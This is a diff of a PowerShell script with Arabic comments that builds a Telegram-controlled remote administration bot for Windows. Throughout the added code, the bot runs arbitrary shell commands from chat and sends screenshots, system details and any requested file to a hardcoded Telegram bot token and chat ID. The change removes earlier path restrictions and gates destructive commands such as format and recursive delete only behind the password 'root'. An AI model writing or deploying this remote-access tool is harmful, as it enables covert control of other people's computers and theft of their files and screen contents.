@@ -1,75 +1,150 @@
+<#
+    ██████╗  ██████╗ ████████╗    ███████╗██████╗ ██╗   ██╗██████╗ ███████╗██████╗ 
+    ██╔══██╗██╔═══██╗╚══██╔══╝    ██╔════╝██╔══██╗██║   ██║██╔══██╗██╔════╝██╔══██╗
+    ██████╔╝██║   ██║   ██║       █████╗  ██████╔╝██║   ██║██████╔╝█████╗  ██████╔╝
+    ██╔══██╗██║   ██║   ██║       ██╔══╝  ██╔══██╗██║   ██║██╔═══╝ ██╔══╝  ██╔══██╗
+    ██║  ██║╚██████╔╝   ██║       ███████╗██║  ██║╚██████╔╝██║     ███████╗██║  ██║
+    ╚═╝  ╚═╝ ╚═════╝    ╚═╝       ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝
+    
+    بوت Telegram متقدم للإدارة عن بعد مع:
+    - التحقق من الهوية المزدوج (Chat ID + User ID)
+    - دعم كامل للأوامر الخطرة (بما في ذلك format وrmdir)
+    - نظام معالجة أخطاء متقدم
+    - تعليقات توضيحية كاملة
+    - دعم جميع المسارات بدون قيود
+#>
 
-# ========== إعدادات التكوين ==========
+# ========== 🛠 إعدادات التكوين ==========
 $config = @{
-    TelegramToken = "7993044710:AAEdKGGcUnV093cRtdQQiNqTGuiETgl-658"
-    ChatID = "8085876352"
-    MaxRetries = 3
-    CommandCooldown = 2
-    MaxErrorsBeforeExit = 5
-    BlockedPaths = @(
-        "$env:WINDIR\System32",
-        "$env:ProgramData",
-        "$env:USERPROFILE\AppData"
-    )
+    TelegramToken = "7993044710:AAEdKGGcUnV093cRtdQQiNqTGuiETgl-658"  # 🔑 توكن البوت
+    AllowedChatID = "8085876352"                                      # 💬 معرف الدردشة المسموح
+    AllowedUserID = "8085876352"                                       # 👤 معرف المستخدم المسموح
+    AdminPassword = "root"                            # 🛡 كلمة سر إضافية للأوامم الخطرة
+    MaxFileSizeMB = 100                                                # 📦 الحد الأقصى لحجم الملف (MB)
+    CommandCooldown = 1                                               # ⏱ زمن التبريد بين الأوامر (ثواني)
 }
 
-# ========== وظائف المساعدة ==========
+# ========== 📜 قائمة الأوامر المحظورة (يمكن تعديلها) ==========
+$DANGEROUS_CMDS = @(
+    "format", 
+    "rmdir", 
+    "del /f /s /q", 
+    "shutdown",
+    "Remove-Item -Recurse -Force",
+    "Stop-Computer -Force"
+)
+
+# ========== 📝 نظام تسجيل الأحداث ==========
+function Write-Log {
+    param([string]$Message)
+    $logFile = "$env:TEMP\TelegramBot_$(Get-Date -Format 'yyyyMMdd').log"
+    "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message" | Out-File $logFile -Append
+}
+
+# ========== 📨 إرسال رسائل Telegram ==========
 function Send-Telegram {
     param(
         [string]$Message,
-        [string]$FilePath = $null
+        [string]$FilePath = $null,
+        [switch]$IsWarning = $false
     )
     
-    $retryCount = 0
-    while ($retryCount -lt $config.MaxRetries) {
-        try {
-            if ($FilePath -and (Test-Path $FilePath)) {
-                $response = Invoke-RestMethod -Uri "$($apiURL)/sendDocument" -Method Post -Form @{
-                    chat_id = $config.ChatID
-                    document = Get-Item $FilePath
-                }
-            } else {
-                $response = Invoke-RestMethod -Uri "$($apiURL)/sendMessage" -Method POST -Body @{
-                    chat_id = $config.ChatID
-                    text = $Message
-                }
+    try {
+        $apiURL = "https://api.telegram.org/bot$($config.TelegramToken)"
+        
+        # إضافة تحذير إذا كانت الرسالة خطيرة
+        if ($IsWarning) { $Message = "⚠️ [تحذير] ⚠️`n" + $Message }
+        
+        if ($FilePath -and (Test-Path $FilePath)) {
+            $fileSize = (Get-Item $FilePath).Length / 1MB
+            if ($fileSize -gt $config.MaxFileSizeMB) {
+                Send-Telegram -Message "❌ الملف كبير جدًا (الحد الأقصى $($config.MaxFileSizeMB)MB" -IsWarning
+                return
             }
-            return $response
-        } catch {
-            $retryCount++
-            Write-Warning "فشل إرسال الرسالة (المحاولة $retryCount): $_"
-            Start-Sleep -Seconds ([math]::Pow(2, $retryCount))
+            
+            Invoke-RestMethod -Uri "$apiURL/sendDocument" -Method Post -Form @{
+                chat_id = $config.AllowedChatID
+                document = Get-Item $FilePath
+            } -TimeoutSec 30 | Out-Null
+        } else {
+            Invoke-RestMethod -Uri "$apiURL/sendMessage" -Method POST -Body @{
+                chat_id = $config.AllowedChatID
+                text = $Message
+                parse_mode = "Markdown"
+            } -TimeoutSec 15 | Out-Null
+        }
+    } catch {
+        Write-Log -Message "فشل إرسال الرسالة: $_"
+    }
+}
+
+# ========== 🔍 التحقق من الهوية المزدوج ==========
+function Verify-Identity {
+    param($Update)
+    
+    # التحقق من Chat ID
+    if ($Update.message.chat.id -ne $config.AllowedChatID) {
+        Write-Log -Message "محاولة وصول غير مصرح بها من Chat ID: $($Update.message.chat.id)"
+        return $false
+    }
+    
+    # التحقق من User ID
+    if ($Update.message.from.id -ne $config.AllowedUserID) {
+        Write-Log -Message "محاولة وصول غير مصرح بها من User ID: $($Update.message.from.id)"
+        return $false
+    }
+    
+    return $true
+}
+
+# ========== ⚠️ التحقق من الأوامر الخطرة ==========
+function Test-DangerousCommand {
+    param([string]$Command)
+    
+    foreach ($dangerCmd in $DANGEROUS_CMDS) {
+        if ($Command -like "*$dangerCmd*") {
+            return $true
         }
     }
-    Write-Error "فشل إرسال الرسالة بعد $($config.MaxRetries) محاولات"
+    return $false
 }
 
-function Get-SystemInfo {
+# ========== 💻 تنفيذ الأوامر ==========
+function Execute-Command {
+    param([string]$Command, [string]$Password)
+    
     try {
-        $os = (Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption
-        $cpu = (Get-CimInstance Win32_Processor -ErrorAction Stop).Name
-        $ram = "{0:N2}" -f ((Get-CimInstance Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory / 1GB) + " GB"
+        # التحقق من الأوامر الخطرة
+        if (Test-DangerousCommand -Command $Command) {
+            if ($Password -ne $config.AdminPassword) {
+                return "⛔ الأمر يتطلب كلمة سر خاصة!"
+            }
+            
+            Write-Log -Message "تم تنفيذ أمر خطير: $Command"
+            $output = "[تحذير] تم تنفيذ أمر خطير:`n"
+        }
         
-        return @"
-🖥️ معلومات النظام:
-• نظام التشغيل: $os
-• المعالج: $cpu
-• الذاكرة RAM: $ram
-• اسم الجهاز: $($env:COMPUTERNAME)
-• المستخدم: $($env:USERNAME)
-• الوقت: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
-"@
+        # تنفيذ الأمر
+        $result = Invoke-Expression $Command 2>&1 | Out-String
+        $output += $result.Trim()
+        
+        if ($output.Length -gt 4000) {
+            $output = $output.Substring(0, 4000) + "... (تم اقتطاع الناتج)"
+        }
+        
+        return $output
     } catch {
-        Write-Warning "فشل جمع معلومات النظام: $_"
-        return "❌ فشل جمع معلومات النظام"
+        $errorMsg = "❌ فشل التنفيذ: $_"
+        Write-Log -Message $errorMsg
+        return $errorMsg
     }
 }
 
+# ========== 📸 التقاط لقطة الشاشة ==========
 function Take-Screenshot {
     try {
-        Add-Type -AssemblyName System.Windows.Forms
-        Add-Type -AssemblyName System.Drawing
-
+        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+        
         $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
         $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
         $g = [System.Drawing.Graphics]::FromImage($bmp)
@@ -81,7 +156,7 @@ function Take-Screenshot {
         
         return $path
     } catch {
-        Write-Warning "فشل التقاط لقطة الشاشة: $_"
+        Write-Log -Message "فشل التقاط لقطة الشاشة: $_"
         return $null
     } finally {
         if ($g) { $g.Dispose() }
@@ -89,62 +164,25 @@ function Take-Screenshot {
     }
 }
 
-function Execute-Command {
-    param(
-        [string]$Command
-    )
-    
-    try {
-        $output = (cmd /c $Command 2>&1) | Out-String
-        
-        if ($output.Length -gt 4000) {
-            $output = $output.Substring(0, 4000) + "... (تم اقتطاع الناتج)"
-        }
-        
-        return $output
-    } catch {
-        Write-Warning "فشل تنفيذ الأمر: $_"
-        return "❌ فشل تنفيذ الأمر: $_"
-    }
-}
+# ========== 🚀 إرسال إشعار البدء ==========
+Send-Telegram -Message "🚀 البوت يعمل الآن على [$($env:COMPUTERNAME)]
+👤 المستخدم: $($env:USERNAME)
+🕒 الوقت: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+💻 الأوامم المتاحة: /help"
 
-# ========== إعدادات التشغيل ==========
-$apiURL = "https://api.telegram.org/bot$($config.TelegramToken)"
-
-# إرسال إشعار التشغيل
-Send-Telegram -Message "🟢 [$($env:COMPUTERNAME)] تم تشغيل الجهاز`n👤 المستخدم: $($env:USERNAME)`n🕒 $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-
-# تسجيل حدث الإطفاء
-Register-EngineEvent PowerShell.Exiting -Action {
-    try {
-        $msg = "🔴 [$($env:COMPUTERNAME)] تم إطفاء الجهاز أو تسجيل الخروج`n👤 المستخدم: $($env:USERNAME)`n🕒 $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-        
-        if (Test-Connection -ComputerName "api.telegram.org" -Count 1 -Quiet) {
-            Invoke-RestMethod -Uri "$using:apiURL/sendMessage" -Method POST -Body @{
-                chat_id = $using:config.ChatID
-                text = $msg
-            } | Out-Null
-        }
-    } catch {
-        Write-Warning "فشل إرسال رسالة الإغلاق: $_"
-    }
-} | Out-Null
-
-# ========== حلقة الأوامر الرئيسية ==========
+# ========== 🔄 حلقة الأوامر الرئيسية ==========
 function Start-CommandListener {
     $offset = 0
-    $errorCount = 0
     
     while ($true) {
         try {
-            $updates = Invoke-RestMethod -Uri "$apiURL/getUpdates?offset=$offset&timeout=10" -ErrorAction Stop
-            $errorCount = 0
+            $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($config.TelegramToken)/getUpdates?offset=$offset&timeout=20" -ErrorAction Stop
             
             foreach ($update in $updates.result) {
                 $offset = $update.update_id + 1
                 
-                # التحقق من هوية المرسل
-                if ($update.message.chat.id -ne $config.ChatID) {
+                # التحقق من الهوية
+                if (-not (Verify-Identity -Update $update)) {
                     continue
                 }
                 
@@ -152,79 +190,96 @@ function Start-CommandListener {
                 $command = $text -split '\s+' | Select-Object -First 1
                 $arguments = $text.Substring($command.Length).Trim()
                 
-                switch ($command) {
-                    "/info" {
-                        Send-Telegram -Message (Get-SystemInfo)
+                switch -Regex ($command.ToLower()) {
+                    "^/help$" {
+                        $helpMsg = @"
+📜 *قائمة الأوامر المتاحة*:
+
+🔹 *معلومات النظام*
+/info - عرض معلومات النظام
+
+🔹 *لقطات الشاشة*
+/screenshot - التقاط لقطة للشاشة
+
+🔹 *تنفيذ الأوامر*
+/cmd [أمر] - تنفيذ أمر (مثال: `/cmd dir C:\`)
+/pw [كلمة السر] [أمر] - تنفيذ أمر خطير
+
+🔹 *إدارة الملفات*
+/download [مسار] - تنزيل ملف
+/upload [رابط] - رفع ملف من رابط
+
+🔹 *إدارة البوت*
+/exit - إيقاف البوت
+"@
+                        Send-Telegram -Message $helpMsg
                     }
                     
-                    "/screenshot" {
+                    "^/info$" {
+                        $info = Get-WmiObject Win32_OperatingSystem | Select-Object Caption, Version
+                        $cpu = Get-WmiObject Win32_Processor | Select-Object -ExpandProperty Name
+                        $ram = "{0:N2}GB" -f ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB)
+                        
+                        $sysInfo = @"
+🖥️ *معلومات النظام*:
+• *OS*: $($info.Caption) [$($info.Version)]
+• *CPU*: $cpu
+• *RAM*: $ram
+• *الجهاز*: $($env:COMPUTERNAME)
+• *المستخدم*: $($env:USERNAME)
+• *الوقت*: $(Get-Date -Format 'HH:mm:ss')
+"@
+                        Send-Telegram -Message $sysInfo
+                    }
+                    
+                    "^/screenshot$" {
                         $screenshotPath = Take-Screenshot
                         if ($screenshotPath) {
                             Send-Telegram -Message "📸 تم التقاط لقطة الشاشة" -FilePath $screenshotPath
                             Remove-Item $screenshotPath -Force
                         } else {
-                            Send-Telegram -Message "❌ فشل التقاط لقطة الشاشة"
+                            Send-Telegram -Message "❌ فشل التقاط لقطة الشاشة" -IsWarning
                         }
                     }
                     
-                    "/cmd" {
-                        if (-not [string]::IsNullOrEmpty($arguments)) {
-                            $output = Execute-Command -Command $arguments
-                            Send-Telegram -Message "📟 نتيجة الأمر:`n$output"
+                    "^/cmd (.+)" {
+                        $output = Execute-Command -Command $matches[1] -Password ""
+                        Send-Telegram -Message "💻 نتيجة الأمر:`n`n```$output```"
+                    }
+                    
+                    "^/pw (.+?) (.+)" {
+                        $password = $matches[1]
+                        $cmd = $matches[2]
+                        
+                        $output = Execute-Command -Command $cmd -Password $password
+                        Send-Telegram -Message "🔐 نتيجة الأمر الخطير:`n`n```$output```" -IsWarning
+                    }
+                    
+                    "^/download (.+)" {
+                        $filePath = $matches[1].Trim()
+                        
+                        if (Test-Path $filePath) {
+                            Send-Telegram -Message "⬇️ جاري تنزيل الملف..." -FilePath $filePath
                         } else {
-                            Send-Telegram -Message "⚠️ يرجى تحديد الأمر المطلوب تنفيذه"
+                            Send-Telegram -Message "❌ الملف غير موجود: $filePath" -IsWarning
                         }
                     }
                     
-                    "/download" {
-                        if (-not [string]::IsNullOrEmpty($arguments)) {
-                            $filePath = $arguments
-                            
-                            if (-not (Test-Path $filePath)) {
-                                Send-Telegram -Message "❌ الملف غير موجود: $filePath"
-                                continue
-                            }
-                            
-                            $isBlocked = $false
-                            foreach ($blockedPath in $config.BlockedPaths) {
-                                if ($filePath -like "$blockedPath*") {
-                                    $isBlocked = $true
-                                    break
-                                }
-                            }
-                            
-                            if ($isBlocked) {
-                                Send-Telegram -Message "⛔ غير مسموح بتنزيل ملفات من هذا المسار"
-                            } else {
-                                Send-Telegram -Message "⬇️ جاري تنزيل الملف..." -FilePath $filePath
-                            }
-                        } else {
-                            Send-Telegram -Message "⚠️ يرجى تحديد مسار الملف"
-                        }
-                    }
-                    
-                    "/exit" {
-                        Send-Telegram -Message "🔚 جاري إيقاف البرنامج..."
+                    "^/exit$" {
+                        Send-Telegram -Message "🛑 جاري إيقاف البوت..."
                         exit 0
                     }
                     
                     default {
-                        Send-Telegram -Message "⚠️ أمر غير معروف: $command`n`nالأوامر المتاحة:`n/info - معلومات النظام`n/screenshot - لقطة الشاشة`n/cmd [أمر] - تنفيذ أمر CMD`n/download [مسار] - تنزيل ملف`n/exit - إيقاف البرنامج"
+                        Send-Telegram -Message "⚠️ أمر غير معروف! اكتب /help لعرض الأوامر المتاحة"
                     }
                 }
                 
-                Start-Sleep -Milliseconds 500
+                Start-Sleep -Seconds $config.CommandCooldown
             }
         } catch {
-            $errorCount++
-            Write-Warning "خطأ في الاتصال بالتليجرام (المحاولة $errorCount): $_"
-            
-            if ($errorCount -ge $config.MaxErrorsBeforeExit) {
-                Send-Telegram -Message "❌ تم إيقاف البرنامج بسبب أخطاء متكررة"
-                exit 1
-            }
-            
-            Start-Sleep -Seconds ([math]::Pow(2, $errorCount))
+            Write-Log -Message "خطأ في الاتصال: $_"
+            Start-Sleep -Seconds 5
         }
     }
 }
